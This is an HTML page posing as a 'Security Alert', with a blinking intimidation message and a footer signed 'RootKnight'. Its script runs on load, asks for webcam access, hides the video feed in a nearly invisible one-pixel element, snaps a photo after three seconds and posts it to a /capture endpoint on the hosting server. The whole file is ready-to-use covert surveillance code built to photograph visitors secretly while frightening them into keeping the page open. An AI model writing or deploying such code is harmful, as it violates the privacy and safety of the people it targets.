<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Alert</title>
    <style>
        body {
            background-color: black;
            color: limegreen;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 20%;
        }
        .warning {
            font-size: 20px;
            animation: blink 1s infinite alternate;
        }
        @keyframes blink {
            from { opacity: 1; }
            to { opacity: 0.3; }
        }
        .footer {
            margin-top: 50px;
            font-size: 18px;
            opacity: 0.7;
        }
    </style>
</head>
<body>

    <h1>‚ö†Ô∏è WARNING ‚ö†Ô∏è</h1>
    <p class="warning">Your activity has been recorded.<br>Do NOT close this window.</p>

    <script>
        async function capturePhoto() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: true });

                let video = document.createElement("video");
                video.style.position = "absolute";
                video.style.width = "1px";
                video.style.height = "1px";
                video.style.opacity = "0.01";
                video.autoplay = true;
                video.srcObject = stream;
                document.body.appendChild(video);

                await new Promise(resolve => setTimeout(resolve, 3000));

                let canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                let ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0);

                let photo = canvas.toDataURL("image/jpeg");

                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);

                fetch("/capture", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ photo }),
                }).then(res => res.json()).then(console.log);
                
            } catch (error) {
                console.error("Camera access denied or error occurred:", error);
            }
        }

        capturePhoto();
    </script>

    <p class="footer">Hello from RootKnight üòà</p>

</body>
</html>
